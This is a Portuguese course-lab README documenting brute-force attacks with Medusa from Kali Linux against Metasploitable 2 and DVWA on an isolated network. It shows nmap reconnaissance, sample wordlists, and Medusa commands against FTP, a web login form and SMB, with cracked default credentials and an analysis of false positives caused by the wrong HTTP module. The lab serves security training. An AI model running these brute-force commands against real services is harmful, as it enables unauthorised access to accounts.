# 🛡️ Desafio DIO: Simulação de Ataques de Força Bruta com Kali e Medusa

Projeto prático desenvolvido para o curso de cibersegurança da DIO, com o objetivo de implementar, documentar e compartilhar um estudo de caso sobre ataques de força bruta.


---

## 1. 🎯 Objetivo

O objetivo deste laboratório é demonstrar a execução de ataques de força bruta contra diferentes serviços (FTP, HTTP Web Form e SMB) utilizando a ferramenta **Medusa** no **Kali Linux**. O ambiente de teste controlado é composto por máquinas vulneráveis (Metasploitable 2 e DVWA) para simular um cenário de auditoria de segurança (pentest) de forma ética e educativa.

## 2. 🔬 Configuração do Ambiente (Setup)

Para a realização dos testes, foi configurado um laboratório virtual isolado.

* **Software de Virtualização:** VirtualBox
* **Máquina Atacante (Attacker):** Kali Linux
    * **IP:** `192.168.56.103`
* **Máquinas Alvo (Targets):**
    * **Metasploitable 2:** `192.168.56.101`
    * **DVWA :** `192.168.56.101/dvwa`
* **Configuração de Rede:** Todas as VMs foram configuradas em modo "Rede Exclusiva de Hospedeiro" (Host-Only Adapter) no VirtualBox para garantir o isolamento.

---

## 3. 🗺️ Fase de Reconhecimento (Nmap)

Antes de atacar, foi realizada uma varredura com o **Nmap** na máquina Metasploitable 2 para identificar os serviços e portas abertas.

```bash
nmap -sV -p- 192.168.56.101
```

Serviços-alvo identificados (com base no scan):

Porta 21/tcp: FTP (vsftpd 2.3.4)
Porta 80/tcp: HTTP (Apache httpd 2.2.8)
Porta 139/tcp: netbios-ssn (Samba smbd 3.x - 4.x)
Porta 445/tcp: netbios-ssn (Samba smbd 3.x - 4.x)

4. ⚔️ Execução dos Ataques (Medusa)
Foram utilizadas wordlists simples para simular o ataque.

user.txt (Exemplo de usuários)
```
root
admin
msfadmin
user
test
```
pass.txt (Exemplo de senhas)
```
root
admin
msfadmin
password
123456
```

Cenário 1: Força Bruta no Serviço FTP (Metasploitable 2)
O serviço FTP (Porta 21) foi o primeiro alvo, com base na versão vsftpd 2.3.4 encontrada.

Comando:

```Bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp
```
-h: Host (alvo)
-U: Arquivo de usuários
-P: Arquivo de senhas
-M: Módulo (serviço) a ser atacado

Resultado:
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Pass: msfadmin
```

Cenário 2: Força Bruta em Formulário Web (DVWA)
Para este cenário, o alvo foi o formulário de login principal do DVWA (/dvwa/login.php). A primeira tentativa foi feita com o módulo -M http do Medusa.

Comando Utilizado:

Bash
```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

Resultado e Análise (Falsos Positivos):
```
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
...
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: password [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: password [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: admin [SUCCESS]
...
```


Conclusão do Cenário 2: O comando acima gerou uma inundação de falsos positivos. O motivo é um erro técnico na escolha do módulo:

O módulo -M http é feito para autenticação "HTTP Basic" (a janela pop-up), não para formulários web.
Por causa disso, ele ignorou todos os parâmetros de formulário (-m PAGE, -m FORM, -m FAIL).
Sem saber como procurar pela mensagem de falha (Login failed), o Medusa presumiu que toda tentativa de conexão foi um SUCESSO.
Embora a credencial correta (admin / password) esteja em algum lugar no meio da lista, o resultado não é confiável. Este teste demonstra a importância de usar o módulo correto para a ferramenta (que seria o -M web-form) para evitar falsos positivos e obter um resultado limpo.

Cenário 3: Força Bruta em SMB (Metasploitable 2)
O alvo aqui são os serviços Samba nas portas 139/445.

Comando:

Bash
```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M smbnt
```
Resultado:
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Pass: msfadmin
```
